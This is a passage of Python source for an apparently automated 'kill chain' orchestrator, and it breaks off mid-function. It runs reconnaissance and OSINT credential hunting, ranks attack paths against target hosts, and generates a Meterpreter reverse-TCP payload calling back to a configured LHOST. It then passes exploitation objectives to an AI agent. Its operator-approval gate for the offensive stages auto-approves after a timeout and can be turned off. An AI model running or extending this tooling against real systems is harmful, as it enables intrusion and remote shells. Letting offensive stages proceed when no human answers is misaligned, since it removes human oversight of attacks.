"""
Kill Chain State Machine - orchestrates stages 1-7
"""
import asyncio
import json
import logging
import os
from datetime import datetime
from typing import Any, AsyncGenerator, Callable, Optional, TypeVar

import httpx

T = TypeVar("T")

# Configurable timeouts (seconds)
AGENT_STAGE_TIMEOUT = float(os.getenv("KILL_CHAIN_AGENT_TIMEOUT", "600"))
HTTP_RETRY_ATTEMPTS = int(os.getenv("KILL_CHAIN_HTTP_RETRIES", "3"))
HTTP_RETRY_DELAY = float(os.getenv("KILL_CHAIN_HTTP_RETRY_DELAY", "2.0"))


async def _retry_async(
    fn: Callable[[], Any],
    max_attempts: int = HTTP_RETRY_ATTEMPTS,
    delay: float = HTTP_RETRY_DELAY,
    operation: str = "request",
) -> T:
    """Retry an async call on transient failures (ConnectionError, timeout, 5xx)."""
    last_err = None
    for attempt in range(1, max_attempts + 1):
        try:
            result = await fn()
            return result
        except (httpx.ConnectError, httpx.TimeoutException, httpx.RemoteProtocolError) as e:
            last_err = e
            if attempt < max_attempts:
                logger.warning(f"{operation} attempt {attempt}/{max_attempts} failed: {e}. Retrying in {delay}s...")
                await asyncio.sleep(delay)
            else:
                raise
    raise last_err or RuntimeError(f"{operation} failed after {max_attempts} attempts")


from models import (
    KillChainLogEvent,
    KillChainState,
    KillChainStatus,
    STAGE_NAMES,
)

logger = logging.getLogger(__name__)

# Default payload type for weaponization
DEFAULT_PAYLOAD_TYPE = "windows_meterpreter_reverse_tcp"

RECON_PHASES = [
    "Domain Discovery",
    "Port Scanning",
    "HTTP Probing",
    "Resource Enumeration",
    "Vulnerability Scanning",
    "MITRE Enrichment",
    "GitHub Secret Hunt",
]


class KillChainStateMachine:
    """Orchestrates the full cyber kill chain (stages 1-7)"""

    def __init__(
        self,
        project_id: str,
        user_id: str,
        recon_orchestrator_url: str,
        webapp_api_url: str,
        recon_webapp_api_url: str = "",
        agent_api_url: str = "",
        kill_chain_orchestrator_url: str = "",
    ):
        self.project_id = project_id
        self.user_id = user_id
        self.recon_orchestrator_url = recon_orchestrator_url.rstrip("/")
        self.webapp_api_url = webapp_api_url.rstrip("/")
        self.recon_webapp_api_url = (recon_webapp_api_url or webapp_api_url).rstrip("/")
        self.agent_api_url = (agent_api_url or os.getenv("AGENT_API_URL", "http://localhost:8080")).rstrip("/")
        self.kill_chain_orchestrator_url = (kill_chain_orchestrator_url or os.getenv("KILL_CHAIN_ORCHESTRATOR_URL", "http://localhost:8015")).rstrip("/")
        self._status = KillChainStatus.IDLE
        self._current_stage = 1
        self._started_at: Optional[datetime] = None
        self._completed_at: Optional[datetime] = None
        self._error: Optional[str] = None
        self._stop_requested = False
        self._pause_requested = False
        self._resume_event: Optional[asyncio.Event] = None  # Set when run starts
        self._session_obtained = False  # Set by Stage 4 agent if session opened
        self._current_sub_step: Optional[str] = None
        # Stage 2 output for later stages
        self._attack_paths: list[dict[str, Any]] = []
        self._selected_attack_path: Optional[dict[str, Any]] = None
        self._payload_ref: Optional[dict[str, Any]] = None
        # Persistence: run ID from webapp DB (set after first persist call)
        self._run_id: Optional[str] = None
        # Force advance: when set, the current stage exits and run_and_emit() dispatches to this stage
        self._force_advance_to: Optional[int] = None
        # HITL (Human-in-the-Loop): pause before active offensive stages (4-7) for operator approval
        self._hitl_enabled: bool = True  # Can be disabled for automated/test runs
        self._operator_input_event: Optional[asyncio.Event] = None
        self._operator_instructions: Optional[str] = None  # Set by submit_operator_input()
        self._operator_action: str = "approve"  # "approve" | "skip" | "stop"
        self._operator_briefing: Optional[dict[str, Any]] = None  # Current stage briefing

    @property
    def status(self) -> KillChainStatus:
        return self._status

    @property
    def current_stage(self) -> int:
        return self._current_stage

    def get_state(self) -> KillChainState:
        return KillChainState(
            project_id=self.project_id,
            status=self._status,
            current_stage=self._current_stage,
            current_stage_name=STAGE_NAMES.get(self._current_stage, "Unknown"),
            current_sub_step=self._current_sub_step,
            started_at=self._started_at,
            completed_at=self._completed_at,
            error=self._error,
        )

    def request_stop(self) -> None:
        self._stop_requested = True

    def request_pause(self) -> None:
        self._pause_requested = True
        if self._resume_event:
            self._resume_event.clear()

    def request_resume(self) -> None:
        self._pause_requested = False
        if self._resume_event:
            self._resume_event.set()

    def request_advance(self, target_stage: int) -> bool:
        """Request a forced advance to target_stage. Returns True if valid."""
        if target_stage <= self._current_stage or target_stage > 7:
            return False
        self._force_advance_to = target_stage
        return True

    def submit_operator_input(self, stage: int, instructions: str, action: str) -> bool:
        """
        Accept operator input during a HITL pause.
        action: "approve" (run with instructions), "skip" (skip stage), "stop" (end run)
        Returns True if the machine was actually waiting for this stage.
        """
        if self._status != KillChainStatus.WAITING_FOR_OPERATOR:
            return False
        self._operator_instructions = instructions.strip() if instructions else None
        self._operator_action = action  # "approve" | "skip" | "stop"
        if self._operator_input_event:
            self._operator_input_event.set()
        return True

    async def _wait_for_operator_input(
        self,
        stage: int,
        stage_name: str,
        briefing: dict[str, Any],
        timeout_minutes: int = 30,
    ) -> tuple[str, Optional[str]]:
        """
        Pause the kill chain and wait for human operator approval.
        Returns (action, instructions) where action is "approve"|"skip"|"stop".
        Times out after timeout_minutes and auto-approves with no instructions.
        """
        if not self._hitl_enabled:
            return ("approve", None)

        self._operator_briefing = briefing
        self._operator_action = "approve"
        self._operator_instructions = None
        self._operator_input_event = asyncio.Event()
        self._status = KillChainStatus.WAITING_FOR_OPERATOR
        await self._persist_state()

        logger.info(f"[HITL] Stage {stage}: {stage_name} — waiting for operator approval (timeout: {timeout_minutes}m)")
        try:
            await asyncio.wait_for(
                self._operator_input_event.wait(),
                timeout=timeout_minutes * 60,
            )
        except asyncio.TimeoutError:
            logger.warning(f"[HITL] Stage {stage}: operator timeout after {timeout_minutes}m — auto-approving with no instructions")
            self._operator_action = "approve"
            self._operator_instructions = None

        action = self._operator_action
        instructions = self._operator_instructions
        self._operator_input_event = None
        self._operator_briefing = None
        self._status = KillChainStatus.RUNNING
        return (action, instructions)

    async def _persist_state(self) -> None:
        """
        Persist current stage/status to PostgreSQL via the webapp API.
        Creates a new run record on first call, updates it on subsequent calls.
        Errors are logged but never raised — persistence is best-effort.
        """
        try:
            payload: dict[str, Any] = {
                "userId": self.user_id,
                "status": self._status.value,
                "currentStage": self._current_stage,
                "currentSubStep": self._current_sub_step,
                "sessionObtained": self._session_obtained,
                "error": self._error,
                "startedAt": self._started_at.isoformat() if self._started_at else None,
                "completedAt": self._completed_at.isoformat() if self._completed_at else None,
            }
            if self._selected_attack_path:
                payload["selectedAttackPath"] = self._selected_attack_path
            if self._payload_ref:
                payload["payloadRef"] = self._payload_ref
            if self._run_id:
                payload["runId"] = self._run_id
            if self._operator_briefing is not None:
                payload["operatorBriefing"] = self._operator_briefing
                payload["waitingForOperator"] = self._status == KillChainStatus.WAITING_FOR_OPERATOR

            async with httpx.AsyncClient(timeout=8) as client:
                resp = await client.post(
                    f"{self.webapp_api_url}/api/kill-chain/{self.project_id}/runs",
                    json=payload,
                )
                if resp.status_code in (200, 201):
                    data = resp.json()
                    if not self._run_id and data.get("id"):
                        self._run_id = data["id"]
        except Exception as exc:
            logger.warning(f"[persist_state] Failed to persist kill chain state: {exc}")

    async def _generate_report(self) -> None:
        """
        Trigger automated report generation at kill chain completion.
        Calls POST /api/reports/{project_id}/generate on the webapp.
        Best-effort — failures are logged but do not raise.
        """
        webapp_url = os.getenv("WEBAPP_INTERNAL_URL", "http://webapp:3000")
        try:
            payload: dict = {
                "run_id": self._run_id,
                "status": self._status.value if hasattr(self._status, "value") else str(self._status),
            }
            async with httpx.AsyncClient(timeout=30) as client:
                resp = await client.post(
                    f"{webapp_url}/api/reports/{self.project_id}/generate",
                    json=payload,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    logger.info(
                        f"[report] Auto-report generated for project {self.project_id} — "
                        f"risk={data.get('overallRisk')}, "
                        f"vulns={data.get('vulnerabilityCount')}, "
                        f"url={data.get('reportUrl')}"
                    )
                else:
                    logger.warning(f"[report] Report generation returned {resp.status_code}")
        except Exception as exc:
            logger.warning(f"[report] Auto-report generation failed (non-fatal): {exc}")

    def _recon_log_to_kill_chain(
        self,
        log: str,
        timestamp: str,
        phase: Optional[str] = None,
        phase_number: Optional[int] = None,
        is_phase_start: Optional[bool] = None,
        level: str = "info",
    ) -> KillChainLogEvent:
        """Transform a recon log event to KillChainLogEvent with stage=1"""
        return KillChainLogEvent(
            log=log,
            timestamp=datetime.fromisoformat(timestamp.replace("Z", "+00:00")) if isinstance(timestamp, str) else datetime.utcnow(),
            stage=1,
            stageName="Reconnaissance",
            subStep=phase or "Reconnaissance",
            subStepNumber=phase_number,
            toolName=None,
            level=level,
            phase=phase,
            phaseNumber=phase_number,
            isPhaseStart=is_phase_start,
        )

    async def _wait_if_paused(self) -> None:
        """If paused, wait until resume. Check stop as well."""
        if not self._pause_requested:
            return
        self._status = KillChainStatus.PAUSED
        if not self._resume_event:
            self._resume_event = asyncio.Event()
        while self._pause_requested and not self._stop_requested:
            try:
                await asyncio.wait_for(self._resume_event.wait(), timeout=1.0)
            except asyncio.TimeoutError:
                continue
        if self._stop_requested:
            return
        self._status = KillChainStatus.RUNNING

    async def _transition_to_next_stage(
        self,
        from_stage: int,
        default_next: int,
    ) -> AsyncGenerator[KillChainLogEvent, None]:
        """Handle stage transitions with force-advance support.

        Emits the transition log event, updates current_stage, and yields all
        events from the target stage (and its chain). Respects _force_advance_to
        requests set by request_advance().
        """
        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        await self._wait_if_paused()

        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        # Determine target stage — respect force-advance request
        if self._force_advance_to and self._force_advance_to > from_stage:
            next_stage = self._force_advance_to
            self._force_advance_to = None
            next_name = STAGE_NAMES.get(next_stage, f"Stage {next_stage}")
            skipped = list(range(from_stage + 1, next_stage))
            skip_msg = f" (skipped: {', '.join(str(s) for s in skipped)})" if skipped else ""
            yield KillChainLogEvent(
                log=f"[>>] Manually advancing to Stage {next_stage}: {next_name}{skip_msg}",
                timestamp=datetime.utcnow(),
                stage=next_stage,
                stageName=next_name,
                subStep="Manual Advance",
                level="action",
            )
        else:
            next_stage = default_next
            next_name = STAGE_NAMES.get(next_stage, f"Stage {next_stage}")
            yield KillChainLogEvent(
                log=f"[+] Stage {from_stage} complete, starting Stage {next_stage}: {next_name}",
                timestamp=datetime.utcnow(),
                stage=next_stage,
                stageName=next_name,
                subStep="Transition",
                level="info",
            )

        self._current_stage = next_stage
        self._status = KillChainStatus.RUNNING
        stage_fn = getattr(self, f"run_stage_{next_stage}", None)
        if stage_fn:
            async for ev in stage_fn():
                yield ev

    async def _poll_recon_until_done(self, timeout_minutes: int = 60) -> str:
        """
        Poll the recon orchestrator until the recon process reaches a terminal state.

        Used as a fallback when the recon SSE log stream closes prematurely (connection
        drop, container reload exception, etc.) so Stage 1 → Stage 2 still transitions.

        Returns the terminal status string: "completed" | "error" | "idle" | "stopping"
        """
        terminal = {"completed", "error", "idle", "stopping"}
        deadline = asyncio.get_event_loop().time() + timeout_minutes * 60
        poll_interval = 15  # seconds between polls

        while asyncio.get_event_loop().time() < deadline:
            if self._stop_requested:
                return "stopping"
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    r = await client.get(
                        f"{self.recon_orchestrator_url}/recon/{self.project_id}/status"
                    )
                    if r.status_code == 200:
                        data = r.json()
                        status = data.get("status", "unknown")
                        if status in terminal:
                            return status
            except Exception:
                pass  # Keep polling despite transient errors
            await asyncio.sleep(poll_interval)

        return "error"  # Timed out

    async def run_stage_1(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 1: Reconnaissance - delegate to recon orchestrator, proxy SSE.

        Concurrently polls SpiderFoot OSINT scan status and emits progress
        events into the kill chain log stream.
        """
        self._resume_event = asyncio.Event()
        self._resume_event.set()
        self._status = KillChainStatus.RUNNING
        self._current_stage = 1

        # Start recon
        async with httpx.AsyncClient(timeout=30.0) as client:
            try:
                start_resp = await client.post(
                    f"{self.recon_orchestrator_url}/recon/{self.project_id}/start",
                    json={
                        "project_id": self.project_id,
                        "user_id": self.user_id,
                        "webapp_api_url": self.recon_webapp_api_url,  # Host-reachable URL for recon container (network_mode: host)
                        "target_domain": "",  # Recon orchestrator fetches from webapp
                    },
                )
                if start_resp.status_code != 200:
                    err_data = start_resp.json() if start_resp.content else {}
                    raise Exception(err_data.get("detail", start_resp.text))
            except Exception as e:
                self._status = KillChainStatus.ERROR
                self._error = str(e)
                yield KillChainLogEvent(
                    log=f"[!] Failed to start recon: {e}",
                    timestamp=datetime.utcnow(),
                    stage=1,
                    stageName="Reconnaissance",
                    subStep="Start",
                    level="error",
                )
                return

        # ── SpiderFoot concurrent polling ─────────────────────────────────────
        # Push SpiderFoot status updates into a queue so we can interleave them
        # with the main recon SSE stream.
        sf_queue: asyncio.Queue = asyncio.Queue()

        async def _poll_spiderfoot():
            """Background task: poll OSINT status every 30s, push to queue."""
            await asyncio.sleep(15)  # Give SpiderFoot time to register the scan
            last_status = None
            polls_without_scan = 0
            consecutive_errors = 0
            max_errors = 3  # Give up after 3 consecutive non-200 responses

            while True:
                try:
                    async with httpx.AsyncClient(timeout=10.0) as sf_client:
                        r = await sf_client.get(
                            f"{self.recon_orchestrator_url}/recon/{self.project_id}/osint-status"
                        )
                        if r.status_code == 200:
                            consecutive_errors = 0
                            data = r.json()
                            sf_scan_id = data.get("sf_scan_id")
                            sf_status = data.get("status", "unknown")

                            if not sf_scan_id:
                                polls_without_scan += 1
                                if polls_without_scan >= 3:
                                    await sf_queue.put(None)  # SpiderFoot not available
                                    return
                            else:
                                if sf_status != last_status:
                                    last_status = sf_status
                                    risk = data.get("risk_matrix", {})
                                    risk_summary = ""
                                    if isinstance(risk, dict) and any(risk.values()):
                                        parts = [f"{k}:{v}" for k, v in risk.items() if v]
                                        risk_summary = f" [{', '.join(parts)}]"
                                    await sf_queue.put({
                                        "log": f"[*] OSINT ({sf_scan_id[:8]}): {sf_status}{risk_summary}",
                                        "level": "success" if sf_status == "FINISHED" else "info",
                                        "status": sf_status,
                                        "risk": risk,
                                    })
                                if sf_status in ("FINISHED", "ABORTED", "ERROR-FAILED"):
                                    await sf_queue.put(None)  # Signal done
                                    return
                        else:
                            # Endpoint doesn't exist (404) or other non-200 — SpiderFoot not integrated
                            consecutive_errors += 1
                            if consecutive_errors >= max_errors:
                                await sf_queue.put(None)  # SpiderFoot not available, give up
                                return
                except Exception:
                    pass  # Non-fatal — recon continues regardless

                await asyncio.sleep(30)

        sf_task = asyncio.create_task(_poll_spiderfoot())

        yield KillChainLogEvent(
            log="[*] Stage 1: Reconnaissance + OSINT scanning started concurrently",
            timestamp=datetime.utcnow(),
            stage=1,
            stageName="Reconnaissance",
            subStep="1.0 OSINT + Active Recon",
            level="info",
        )

        # ── Stream recon logs and re-emit as KillChainLogEvent ────────────────
        logs_url = f"{self.recon_orchestrator_url}/recon/{self.project_id}/logs"
        try:
            async with httpx.AsyncClient(timeout=3600.0) as client:
                async with client.stream("GET", logs_url) as response:
                    if response.status_code != 200:
                        yield KillChainLogEvent(
                            log=f"[!] Failed to stream recon logs: {response.status_code}",
                            timestamp=datetime.utcnow(),
                            stage=1,
                            stageName="Reconnaissance",
                            subStep="Logs",
                            level="error",
                        )
                        sf_task.cancel()
                        return

                    buffer = ""
                    async for chunk in response.aiter_text():
                        if self._stop_requested:
                            break
                        # Force advance: exit Stage 1 immediately so run_and_emit() can dispatch
                        if self._force_advance_to is not None:
                            sf_task.cancel()
                            yield KillChainLogEvent(
                                log=f"[>>] Stage 1 interrupted — manually advancing to Stage {self._force_advance_to}: {STAGE_NAMES.get(self._force_advance_to, '')}",
                                timestamp=datetime.utcnow(),
                                stage=self._force_advance_to,
                                stageName=STAGE_NAMES.get(self._force_advance_to, ""),
                                subStep="Manual Advance",
                                level="action",
                            )
                            return  # _force_advance_to stays set; run_and_emit() dispatches
                        if self._stop_requested:
                            async with httpx.AsyncClient() as stop_client:
                                try:
                                    await stop_client.post(
                                        f"{self.recon_orchestrator_url}/recon/{self.project_id}/stop"
                                    )
                                except Exception:
                                    pass
                            self._status = KillChainStatus.STOPPING
                            sf_task.cancel()
                            return

                        # Drain SpiderFoot queue and emit any pending events
                        while not sf_queue.empty():
                            sf_msg = sf_queue.get_nowait()
                            if sf_msg is not None:
                                yield KillChainLogEvent(
                                    log=sf_msg["log"],
                                    timestamp=datetime.utcnow(),
                                    stage=1,
                                    stageName="Reconnaissance",
                                    subStep="OSINT",
                                    level=sf_msg.get("level", "info"),
                                    metadata={"risk_matrix": sf_msg.get("risk")} if sf_msg.get("risk") else None,
                                )

                        buffer += chunk
                        # SSE events are separated by double newline (\n\n or \r\n\r\n)
                        while "\n\n" in buffer or "\r\n\r\n" in buffer:
                            sep = "\n\n" if "\n\n" in buffer else "\r\n\r\n"
                            event_block, buffer = buffer.split(sep, 1)
                            event_type = None
                            event_data = None
                            for line in event_block.replace("\r", "").split("\n"):
                                if line.startswith("event:"):
                                    event_type = line[6:].strip()
                                elif line.startswith("data:"):
                                    try:
                                        event_data = json.loads(line[5:].strip())
                                    except json.JSONDecodeError:
                                        pass

                            if event_type == "log" and event_data:
                                kc_event = self._recon_log_to_kill_chain(
                                    log=event_data.get("log", ""),
                                    timestamp=event_data.get("timestamp", datetime.utcnow().isoformat()),
                                    phase=event_data.get("phase"),
                                    phase_number=event_data.get("phaseNumber"),
                                    is_phase_start=event_data.get("isPhaseStart"),
                                    level=event_data.get("level", "info"),
                                )
                                yield kc_event
                            elif event_type == "complete" and event_data:
                                status = event_data.get("status", "completed")

                                # Drain SpiderFoot before transitioning
                                sf_task.cancel()
                                try:
                                    await asyncio.wait_for(sf_task, timeout=2.0)
                                except (asyncio.CancelledError, asyncio.TimeoutError):
                                    pass
                                while not sf_queue.empty():
                                    sf_msg = sf_queue.get_nowait()
                                    if sf_msg is not None:
                                        yield KillChainLogEvent(
                                            log=sf_msg["log"],
                                            timestamp=datetime.utcnow(),
                                            stage=1,
                                            stageName="Reconnaissance",
                                            subStep="OSINT",
                                            level=sf_msg.get("level", "info"),
                                        )

                                # If the SSE stream closed while recon was still running
                                # (e.g. connection drop, container reload exception),
                                # poll the recon orchestrator directly until it finishes.
                                if status not in ("completed", "error") and not self._stop_requested:
                                    yield KillChainLogEvent(
                                        log=f"[*] Recon stream closed early (status={status}), polling for completion...",
                                        timestamp=datetime.utcnow(),
                                        stage=1,
                                        stageName="Reconnaissance",
                                        subStep="Polling",
                                        level="info",
                                    )
                                    status = await self._poll_recon_until_done()
                                    yield KillChainLogEvent(
                                        log=f"[+] Recon polled to completion: {status}",
                                        timestamp=datetime.utcnow(),
                                        stage=1,
                                        stageName="Reconnaissance",
                                        subStep="Complete",
                                        level="success" if status == "completed" else "error",
                                    )
                                else:
                                    yield KillChainLogEvent(
                                        log=f"[+] Stage 1 complete: {status}",
                                        timestamp=datetime.utcnow(),
                                        stage=1,
                                        stageName="Reconnaissance",
                                        subStep="Complete",
                                        level="success" if status == "completed" else "error",
                                    )

                                if status == "completed" and not self._stop_requested:
                                    yield KillChainLogEvent(
                                        log="[+] Stage 1: Reconnaissance complete",
                                        timestamp=datetime.utcnow(),
                                        stage=1,
                                        stageName="Reconnaissance",
                                        subStep="Complete",
                                        level="success",
                                    )
                                    async for ev in self._transition_to_next_stage(1, 2):
                                        yield ev
                                else:
                                    if status != "completed":
                                        self._status = KillChainStatus.ERROR
                                        self._error = event_data.get("error") or f"Recon ended with status: {status}"
                                    else:
                                        self._completed_at = datetime.utcnow()
                                        self._status = KillChainStatus.COMPLETED
                                return
                            elif event_type == "error" and event_data:
                                err_msg = event_data.get("error", "Unknown error")
                                self._status = KillChainStatus.ERROR
                                self._error = err_msg
                                sf_task.cancel()
                                yield KillChainLogEvent(
                                    log=f"[!] {err_msg}",
                                    timestamp=datetime.utcnow(),
                                    stage=1,
                                    stageName="Reconnaissance",
                                    subStep="Error",
                                    level="error",
                                )
                                return

        except Exception as e:
            logger.exception("Error streaming recon logs")
            sf_task.cancel()
            # Don't give up — poll recon directly to check if it completed despite stream error
            yield KillChainLogEvent(
                log=f"[!] Recon log stream error: {e} — polling recon status directly",
                timestamp=datetime.utcnow(),
                stage=1,
                stageName="Reconnaissance",
                subStep="Recovery",
                level="warning",
            )
            status = await self._poll_recon_until_done()
            if status == "completed" and not self._stop_requested:
                self._current_stage = 2
                self._status = KillChainStatus.RUNNING
                yield KillChainLogEvent(
                    log="[+] Recon completed (recovered from stream error), starting Stage 2: Weaponization",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="Transition",
                    level="info",
                )
                async for ev in self.run_stage_2():
                    yield ev
            else:
                self._status = KillChainStatus.ERROR
                self._error = f"Recon ended with status: {status}"
                yield KillChainLogEvent(
                    log=f"[!] Recon failed after stream error: {status}",
                    timestamp=datetime.utcnow(),
                    stage=1,
                    stageName="Reconnaissance",
                    subStep="Error",
                    level="error",
                )

    async def run_stage_2(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 2: Weaponization - fetch attack paths, select top, generate payload.

        SpiderFoot OSINT context (leaked credentials, CVEs) from Stage 1 is surfaced
        here to inform target selection and payload prioritisation.
        """
        self._current_stage = 2
        self._status = KillChainStatus.RUNNING
        await self._persist_state()

        # 2.0 Surface SpiderFoot OSINT intelligence from Neo4j
        yield KillChainLogEvent(
            log="[*] Checking OSINT intelligence from Stage 1...",
            timestamp=datetime.utcnow(),
            stage=2,
            stageName="Weaponization",
            subStep="2.0 OSINT Intel",
            subStepNumber=0,
            level="action",
        )
        try:
            async with httpx.AsyncClient(timeout=15.0) as osint_client:
                osint_resp = await osint_client.get(
                    f"{self.webapp_api_url}/api/graph/osint-summary",
                    params={"projectId": self.project_id},
                )
                if osint_resp.status_code == 200:
                    osint_data = osint_resp.json()
                    leaked = osint_data.get("leakedCredentials", 0)
                    vulns = osint_data.get("vulnerabilities", 0)
                    emails = osint_data.get("emails", 0)
                    cloud = osint_data.get("cloudAssets", 0)
                    parts = []
                    if leaked:
                        parts.append(f"{leaked} leaked credential(s) ⚠")
                    if vulns:
                        parts.append(f"{vulns} OSINT vuln(s)")
                    if emails:
                        parts.append(f"{emails} email(s)")
                    if cloud:
                        parts.append(f"{cloud} cloud asset(s)")
                    if parts:
                        yield KillChainLogEvent(
                            log=f"[+] OSINT intel: {', '.join(parts)} — enriching attack path selection",
                            timestamp=datetime.utcnow(),
                            stage=2,
                            stageName="Weaponization",
                            subStep="2.0 OSINT Intel",
                            subStepNumber=0,
                            level="success",
                            metadata=osint_data,
                        )
                    else:
                        yield KillChainLogEvent(
                            log="[*] No OSINT intel available yet (SpiderFoot may still be running)",
                            timestamp=datetime.utcnow(),
                            stage=2,
                            stageName="Weaponization",
                            subStep="2.0 OSINT Intel",
                            level="info",
                        )
        except Exception:
            pass  # Non-fatal — Stage 2 continues without OSINT context

        # 2.1 Fetch Attack Paths
        yield KillChainLogEvent(
            log="[*] Fetching attack paths from graph...",
            timestamp=datetime.utcnow(),
            stage=2,
            stageName="Weaponization",
            subStep="2.1 Fetch Attack Paths",
            subStepNumber=1,
            toolName="GET /api/attack-paths",
            level="action",
        )

        async with httpx.AsyncClient(timeout=30.0) as client:
            try:
                ap_resp = await _retry_async(
                    lambda: client.get(
                        f"{self.webapp_api_url}/api/attack-paths",
                        params={"projectId": self.project_id, "limit": 5},
                    ),
                    operation="Fetch attack paths",
                )
                if ap_resp.status_code != 200:
                    err = ap_resp.text
                    try:
                        err_data = ap_resp.json()
                        err = err_data.get("error", err_data.get("detail", err))
                    except Exception:
                        pass
                    self._status = KillChainStatus.ERROR
                    self._error = f"Attack paths failed: {err}"
                    yield KillChainLogEvent(
                        log=f"[!] Stage 2.1 failed: Could not fetch attack paths ({ap_resp.status_code}). {err}",
                        timestamp=datetime.utcnow(),
                        stage=2,
                        stageName="Weaponization",
                        subStep="2.1 Fetch Attack Paths",
                        level="error",
                    )
                    return

                ap_data = ap_resp.json()
                paths = ap_data.get("attackPaths", [])
                total = ap_data.get("total", 0)

                yield KillChainLogEvent(
                    log=f"[+] Ranked {total} attack path(s) from graph",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="2.1 Fetch Attack Paths",
                    subStepNumber=1,
                    toolName="GET /api/attack-paths",
                    level="success",
                    metadata={"total": total},
                )
                self._attack_paths = paths

                if not paths:
                    yield KillChainLogEvent(
                        log="[*] No attack paths found - skipping payload generation",
                        timestamp=datetime.utcnow(),
                        stage=2,
                        stageName="Weaponization",
                        subStep="2.2 Select Top Path",
                        level="warning",
                    )
                    self._current_stage = 2
                    self._completed_at = datetime.utcnow()
                    self._status = KillChainStatus.COMPLETED
                    return

                # 2.2 Select Top Path
                top = paths[0]
                self._selected_attack_path = top
                name = top.get("name", "Unknown")
                cve_ids = top.get("cveIds", [])
                target = top.get("targetIp") or top.get("targetHost") or "unknown"

                yield KillChainLogEvent(
                    log=f"[*] Selected: {name} on {target}" + (f" (CVE: {cve_ids[0]})" if cve_ids else ""),
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="2.2 Select Top Path",
                    subStepNumber=2,
                    level="info",
                    metadata={"attack_path": top},
                )

                # 2.3 Generate Payload - need LHOST from project or env
                yield KillChainLogEvent(
                    log="[*] Generating payload...",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="2.3 Generate Payload",
                    subStepNumber=3,
                    toolName="POST /api/payloads/generate",
                    level="action",
                )

                proj_resp = await client.get(f"{self.webapp_api_url}/api/projects/{self.project_id}")
                lhost = ""
                lport = "4444"
                if proj_resp.status_code == 200:
                    proj = proj_resp.json()
                    lhost = (proj.get("agentLhost") or "").strip()
                    lp = proj.get("agentLport")
                    if lp is not None:
                        lport = str(lp)
                if not lhost:
                    lhost = os.getenv("KILL_CHAIN_LHOST", "").strip()

                if not lhost:
                    yield KillChainLogEvent(
                        log="[!] LHOST not configured — skipping payload generation. Set agentLhost in project settings or KILL_CHAIN_LHOST env. Continuing to Stage 3.",
                        timestamp=datetime.utcnow(),
                        stage=2,
                        stageName="Weaponization",
                        subStep="2.3 Generate Payload",
                        level="warning",
                    )
                    # Continue without payload — Stage 3+ will note the missing LHOST
                    async for ev in self._transition_to_next_stage(2, 3):
                        yield ev
                    return

                payload_type = DEFAULT_PAYLOAD_TYPE
                payload_resp = await _retry_async(
                    lambda: client.post(
                        f"{self.webapp_api_url}/api/payloads/generate",
                        json={"payloadType": payload_type, "lhost": lhost, "lport": lport},
                    ),
                    operation="Generate payload",
                )

                if payload_resp.status_code != 200:
                    err_data = payload_resp.json() if payload_resp.content else {}
                    err = err_data.get("error", err_data.get("hint", payload_resp.text))
                    yield KillChainLogEvent(
                        log=f"[!] Stage 2.3 failed: Payload generation error ({payload_resp.status_code}). {err}",
                        timestamp=datetime.utcnow(),
                        stage=2,
                        stageName="Weaponization",
                        subStep="2.3 Generate Payload",
                        level="error",
                    )
                    self._status = KillChainStatus.ERROR
                    self._error = err
                    return

                payload_data = payload_resp.json()
                self._payload_ref = payload_data

                yield KillChainLogEvent(
                    log=f"[+] Payload generated: {payload_type}",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="2.3 Generate Payload",
                    subStepNumber=3,
                    toolName="POST /api/payloads/generate",
                    level="success",
                    metadata={"payloadType": payload_type},
                )

                # 2.4 Store Payload Ref
                yield KillChainLogEvent(
                    log="[+] Payload ready for delivery",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="2.4 Store Payload Ref",
                    subStepNumber=4,
                    level="success",
                )

                self._current_stage = 3
                self._status = KillChainStatus.RUNNING
                if not self._stop_requested:
                    async for ev in self._transition_to_next_stage(2, 3):
                        yield ev
                if self._status not in (KillChainStatus.COMPLETED, KillChainStatus.ERROR):
                    self._completed_at = datetime.utcnow()
                    self._status = KillChainStatus.COMPLETED

            except Exception as e:
                logger.exception("Stage 2 error")
                self._status = KillChainStatus.ERROR
                self._error = str(e)
                yield KillChainLogEvent(
                    log=f"[!] Stage 2 error: {e}",
                    timestamp=datetime.utcnow(),
                    stage=2,
                    stageName="Weaponization",
                    subStep="Error",
                    level="error",
                )

    async def _run_agent_stage(
        self,
        stage: int,
        stage_name: str,
        objective: str,
        context: Optional[dict] = None,
    ) -> AsyncGenerator[tuple[bool, Optional[str]], None]:
        """Run an agent stage. Yields (success, error_message)."""
        self._current_stage = stage
        self._current_sub_step = "Invoking agent"
        webhook_url = f"{self.kill_chain_orchestrator_url}/kill-chain/{self.project_id}/webhook"
        payload = {
            "project_id": self.project_id,
            "user_id": self.user_id,
            "stage": stage,
            "objective": objective,
            "context": context or {},
            "webhook_url": webhook_url,
        }
        async with httpx.AsyncClient(timeout=AGENT_STAGE_TIMEOUT) as client:
            try:
                resp = await client.post(
                    f"{self.agent_api_url}/agent/kill-chain-execute",
                    json=payload,
                )
                data = resp.json() if resp.content else {}
                if resp.status_code != 200:
                    err = data.get("error", data.get("detail", resp.text))
                    yield False, f"Stage {stage} agent error ({resp.status_code}): {err}"
                    return
                if not data.get("success", True):
                    err = data.get("error", "Unknown error")
                    yield False, f"Stage {stage} agent reported failure: {err}"
                    return
                # Check for session in response (agent may return session_obtained in context)
                ctx = data.get("context", {})
                if ctx.get("session_obtained"):
                    self._session_obtained = True
                yield True, None
            except httpx.TimeoutException as e:
                logger.exception(f"Stage {stage} agent timeout after {AGENT_STAGE_TIMEOUT}s")
                yield False, f"Stage {stage} agent timeout ({AGENT_STAGE_TIMEOUT}s). The agent may still be running."
            except httpx.ConnectError as e:
